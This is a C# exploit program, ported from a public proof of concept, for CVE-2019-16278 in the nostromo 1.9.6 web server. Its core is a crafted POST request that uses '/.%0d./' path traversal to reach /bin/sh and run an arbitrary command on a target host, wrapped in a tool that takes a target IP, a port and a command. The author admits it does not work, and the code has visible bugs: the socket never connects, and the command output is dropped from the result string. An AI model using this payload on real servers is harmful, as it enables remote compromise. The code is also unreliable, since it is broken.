/* 
 * nostromo 1.9.6 Remote Code Execution exploit (CVE-2019-16278)
 *   Ported by A. S. "Aleksey" Ahmann <alexander.ahmann@outlook.com>
 *   Originally PoC from "Kr0ff" (2020).
 *
 * This is a port of a remote code execution exploit for the nostromo
 * web server from Python (implemented by "Kr0ff" 2020) to the C#
 * programming language. 
 *
 * TODO: At the moment, it is not working and I need to fix it and 
 * test it more.
 */

using System;
using System.Net.Sockets;
using System.Runtime;
using System.Text;

class Exploit {

    public static void Main(string[] args) {
        if (args.Length != 3) {
            PrintHelp();
            Environment.Exit(-1);
        }

        // Main Logic
        Console.WriteLine("[*] Sending exploit ...");
        string result = Injection(
            args[0],
            Convert.ToInt32(args[1]),
            args[2]
        );
        Console.WriteLine(result);
    }

    public static void PrintHelp() {
        Console.WriteLine("================================================================");
        Console.WriteLine("= nostromo 1.9.6 Remote Code Execution (CVE-2019-16278)        =");
        Console.WriteLine("=   By A. S. \"Aleksey\" Ahmann <alexander.ahmann@outlook.com>   =");
        Console.WriteLine("= Usage:                                                       =");
        Console.WriteLine("=   $ ./Exploit.exe <target ip> <target port> <command>        =");
        Console.WriteLine("================================================================\n");
    }

    public static string Injection(string host, int port, string command) {
        string payload = String.Format("POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{0} 2>&1", command);
        string resultant;
        try {
            // I consulted "GiovanniDezio" (2019) when implementing socket programming
            using (Socket conn = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)) {
                string response = "";
                byte[] payload_bytes = Encoding.ASCII.GetBytes(payload);
                conn.Send(payload_bytes);

                while (true) {
                    byte[] resp_buffer = new byte[1024];
                    int bytes_read = conn.Receive(resp_buffer);
                    if (bytes_read == 0)
                        break;
                    response += Encoding.ASCII.GetString(resp_buffer, 0, bytes_read);
                }
                resultant = String.Format("[*] Successful Execution; command output: ", response);
            }
        } catch (Exception e) {
            resultant = String.Format("[-] Exception occured: {0}", e.ToString());
        } 
        return resultant;
    }
}

/* ====================================================================================
 * =                                 References                                       =
 * ====================================================================================
 * "GiovanniDezio" (2019). Socket Programming in C#. GeeksforGeeks. Retrieved on Aug.
 *    20, 2023 from: https://www.geeksforgeeks.org/socket-programming-in-c-sharp/
 * "Kr0ff" (2020). nostromo 1.9.6 - Remote Code Execution. Exploit Database.
 *   Retrieved on Aug. 20, 2023 from: https://www.exploit-db.com/exploits/47837
 * "tryhackme" and "munra" (2023). OWASP Top 10 - 2021. TryHackMe. Retrieved
 *   on Aug. 20, 2023 from: https://tryhackme.com/room/owasptop102021
 */
